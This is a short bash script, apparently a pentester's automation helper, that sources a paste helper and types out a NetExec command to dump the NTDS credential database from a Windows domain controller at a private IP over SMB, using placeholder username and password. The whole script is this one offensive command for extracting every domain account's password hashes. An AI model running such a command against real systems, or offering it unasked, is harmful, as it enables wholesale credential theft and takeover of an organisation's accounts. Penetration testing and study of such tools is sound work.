#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "netexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds"
